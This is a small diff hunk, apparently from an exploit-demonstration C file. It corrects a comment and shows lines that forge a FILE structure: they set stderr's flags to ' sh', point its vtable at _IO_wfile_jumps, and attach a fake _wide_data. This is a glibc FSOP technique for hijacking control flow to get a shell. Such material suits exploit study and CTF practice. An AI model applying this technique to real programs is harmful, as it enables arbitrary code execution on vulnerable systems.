@@ -19,7 +19,7 @@ int main() {
     // _wide_data
     *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
     
-    // _IO_2_1_stdout_
+    // _IO_2_1_stderr_
     *(size_t *)(stderr2) = (size_t) 0x687320; // \x20sh
     *(size_t *)(stderr2 + 0xd8) = (size_t) _IO_wfile_jumps_addr;
     *(size_t *)(stderr2 + 0xa0) = (size_t) wide_data;
